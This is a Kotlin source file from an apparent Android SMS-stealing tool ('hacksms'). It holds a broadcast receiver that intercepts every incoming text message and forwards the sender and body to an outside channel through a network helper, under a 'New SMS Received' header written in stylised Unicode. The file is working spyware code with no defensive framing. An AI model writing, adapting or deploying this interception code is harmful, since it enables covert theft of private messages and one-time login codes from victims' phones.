package cocomelonc.hacksms.tools

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.gsm.SmsMessage


class HackSmsSmsListener : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            if (HackSmsUtils.isPermissionGranted(context)) {
                val bundle = intent.extras
                val messages: Array<SmsMessage?>?
                var sender: String?
                if (bundle != null) {
                    val pdus = bundle["pdus"] as Array<*>?
                    messages = arrayOfNulls(pdus!!.size)
                    for (i in messages.indices) {
                        messages[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                        sender = messages[i]!!.originatingAddress
                        val msgBody = messages[i]!!.messageBody
                        HackSmsNetwork(context).sendTextMessage(
                            "\uD835\uDC0D\uD835\uDC1E\uD835\uDC30 \uD835\uDC12\uD835\uDC0C\uD835\uDC12 \uD835\uDC11\uD835\uDC1E\uD835\uDC1C\uD835\uDC1E\uD835\uDC22\uD835\uDC2F\uD835\uDC1E\uD835\uDC1D\n\n" +
                                    "\uD835\uDC2C\uD835\uDC1E\uD835\uDC27\uD835\uDC1D\uD835\uDC1E\uD835\uDC2B : $sender\n" +
                                    "\uD835\uDC26\uD835\uDC1E\uD835\uDC2C\uD835\uDC2C\uD835\uDC1A\uD835\uDC20\uD835\uDC1E : $msgBody"
                        )
                    }
                }
            }
        }
    }
}